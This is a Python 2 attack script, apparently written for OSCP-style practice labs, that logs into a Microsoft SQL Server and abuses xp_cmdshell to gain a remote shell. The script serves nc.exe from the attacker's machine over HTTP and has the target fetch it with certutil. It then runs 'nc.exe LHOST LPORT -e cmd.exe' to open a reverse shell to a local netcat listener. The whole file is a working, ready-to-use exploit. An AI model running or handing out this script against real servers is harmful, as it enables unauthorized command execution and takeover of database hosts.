#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################################
#█▀▄▀█    ▄▄▄▄▄    ▄▄▄▄▄    ▄▄ █ █         ▄  █ ▄▄  ▄█▄    █▀▄▀█ ██▄      ▄▄▄▄▄    ▄  █ ▄███▄   █    █    █▄▄▄▄ ▄█▄    ▄███▄   #
#█ █ █   █     ▀▄ █     ▀▄ █   █ █     ▀▄   █ █   █ █▀ ▀▄  █ █ █ █  █    █     ▀▄ █   █ █▀   ▀  █    █    █  ▄▀ █▀ ▀▄  █▀   ▀  #
#█ ▄ █ ▄  ▀▀▀▀▄ ▄  ▀▀▀▀▄    ▀▀▀█ █       █ ▀  █▀▀▀  █   ▀  █ ▄ █ █   █ ▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    █    █    █▀▀▌  █   ▀  ██▄▄    #
#█   █  ▀▄▄▄▄▀   ▀▄▄▄▄▀        █ ███▄   ▄ █   █     █▄  ▄▀ █   █ █  █   ▀▄▄▄▄▀    █   █ █▄   ▄▀ ███▄ ███▄ █  █  █▄  ▄▀ █▄   ▄▀ #
#█                           █    ▀ █   ▀▄  █    ▀███▀     █  ███▀                █  ▀███▀       ▀    ▀  █   ▀███▀  ▀███▀      #
#▀                             ▀      ▀       ▀            ▀                      ▀                      ▀                     #
#                                                                                                                              #
# DATE                                                                                                                         #
# 24/07/2019                                                                                                                   #
#                                                                                                                              #
# DESCRIPTION                                                                                                                  #
# This code makes a reverse_tcp connection by execute commands through xp_cmdshell on a mssql server                           #
# This is a rewrite of my old implementation to work with windows XP and OSCP.                                                 #
#                                                                                                                              #
# nighter - http://nighter.se/                                                                                                 #
#                                                                                                                              #
################################################################################################################################

import SimpleHTTPServer
import SocketServer
import signal
import os
import sys
import time
import _mssql

from multiprocessing import Process

# chdir to script working directory
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def prepare_payload():

    if os.path.isfile('./.nc.exe') is False:
        print("[-] netcat payload not found.")
        sys.exit(0)

    os.system('cp ./.nc.exe /tmp/nc.exe 2>/dev/null')
    if os.path.isfile('/tmp/nc.exe') is False:
        print("[-] prepare netcat payload failed.")
        sys.exit(0)

def HttpListener():

    os.chdir('/tmp')
    HTTP_PORT = 8000
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print("[+] HTTP Listen = %s" % HTTP_PORT)
    httpd.serve_forever()


def exploit():
    time.sleep(5)

    mssql = None
    try:
        mssql = _mssql.connect(server=HOST, user=USERNAME, password=PASSWORD)
        print("[+] Successful login at mssql server %s with username %s and password %s" % (HOST, USERNAME, PASSWORD))

        cmd = 'certutil.exe -urlcache -split -f http://%s:8000/nc.exe' % LHOST
        mssql.execute_query("xp_cmdshell '%s'" % cmd)

        time.sleep(2)

        cmd = 'rename Blob0_0.bin nc.exe'
        mssql.execute_query("xp_cmdshell '%s'" % cmd)

        time.sleep(2)

        cmd = 'nc.exe %s %s -e c:\windows\system32\cmd.exe' % (LHOST, LPORT)
        mssql.execute_query("xp_cmdshell '%s'" % cmd)

    except Exception as e:
        print("[-] MSSQL failed: " + str(e))
    finally:
        if mssql:
            mssql.close()

if __name__ == '__main__':

    if len(sys.argv) != 6:
        print ("""
• ▌ ▄ ·. .▄▄ · .▄▄ · .▄▄▄  ▄▄▌  ▐▄• ▄  ▄▄▄· ▄▄· • ▌ ▄ ·. ·▄▄▄▄  .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  ▄▄▄   ▄▄· ▄▄▄ .
·██ ▐███▪▐█ ▀. ▐█ ▀. ▐▀•▀█ ██•   █▌█▌▪▐█ ▄█▐█ ▌▪·██ ▐███▪██▪ ██ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  ▀▄ █·▐█ ▌▪▀▄.▀·
▐█ ▌▐▌▐█·▄▀▀▀█▄▄▀▀▀█▄█▌·.█▌██▪   ·██·  ██▀·██ ▄▄▐█ ▌▐▌▐█·▐█· ▐█▌▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██ ██▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▪▄█·▐█▌▐▌▪▐█·█▌▐█▪·•▐███▌██ ██▌▐█▌██. ██ ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌▐█•█▌▐███▌▐█▄▄▌
▀▀  █▪▀▀▀ ▀▀▀▀  ▀▀▀▀ ·▀▀█. .▀▀▀ •▀▀ ▀▀.▀   ·▀▀▀ ▀▀  █▪▀▀▀▀▀▀▀▀•  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ .▀  ▀·▀▀▀  ▀▀▀ 
[windowsXP version without powershell]
    """)
        print("Usage: %s <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("\nEXAMPLE: ./mssql_xpcmdshell_rce.py 10.10.10.59 10.10.14.24 1337 <USERNAME> <PASSWORD>\n")
        sys.exit(0)

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    print("[+] LHOST = %s" % LHOST)

    prepare_payload()

    # Serve payload
    p = Process(target=HttpListener)
    p.start()

    # Exploit windows
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)
